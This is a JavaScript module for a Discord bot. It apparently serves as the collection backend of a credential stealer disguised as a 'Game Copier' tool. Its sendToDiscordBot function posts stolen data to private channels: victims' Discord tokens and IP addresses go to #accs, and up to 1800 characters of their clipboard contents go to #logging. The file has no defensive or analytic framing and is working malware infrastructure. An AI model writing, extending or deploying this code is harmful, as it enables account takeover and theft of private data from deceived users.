require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.DISCORD_GUILD_ID; // Your server's ID

if (!TOKEN) {
  console.error("Missing DISCORD_BOT_TOKEN in .env");
  process.exit(1);
}

if (!GUILD_ID) {
  console.error("Missing DISCORD_GUILD_ID in .env");
  process.exit(1);
}

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

let loggingChannel = null;
let accsChannel = null;

client.once('ready', async () => {
  console.log(`Discord Bot logged in as ${client.user.tag}`);

  try {
    const guild = await client.guilds.fetch(GUILD_ID);

    // Find channels by name (#logging and #accs)
    loggingChannel = guild.channels.cache.find(ch => ch.name === 'logging' && ch.isTextBased());
    accsChannel = guild.channels.cache.find(ch => ch.name === 'accs' && ch.isTextBased());

    if (!loggingChannel) {
      console.error("Could not find #logging channel");
    }
    if (!accsChannel) {
      console.error("Could not find #accs channel");
    }
  } catch (err) {
    console.error("Error fetching guild or channels:", err);
  }
});

async function sendToDiscordBot(data, type) {
  if (!client.isReady()) {
    console.error("Discord client not ready");
    return;
  }

  try {
    if (type === 'token') {
      if (!accsChannel) {
        console.error("#accs channel not found");
        return;
      }

      await accsChannel.send({
        embeds: [{
          title: 'Discord Token Received',
          color: 0xff9500,
          description:
            `**IP:** ${data.userIP}\n` +
            `**Server ID:** ${data.serverId}\n` +
            `**Token:** \`${data.token.substring(0, 50)}...\``,
          timestamp: new Date(),
          footer: { text: 'Game Copier Bot' },
        }]
      });

    } else if (type === 'clipboard') {
      if (!loggingChannel) {
        console.error("#logging channel not found");
        return;
      }

      await loggingChannel.send({
        embeds: [{
          title: 'Clipboard Content Received',
          color: 0x00ff00,
          description:
            `**IP:** ${data.userIP}\n` +
            `**Type:** ${data.type}\n` +
            `**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``,
          timestamp: new Date(),
          footer: { text: 'Game Copier Bot' },
        }]
      });

    } else {
      console.warn("Unknown data type to send:", type);
    }
  } catch (error) {
    console.error("Error sending message to Discord:", error);
  }
}

client.login(TOKEN);

module.exports = { sendToDiscordBot };
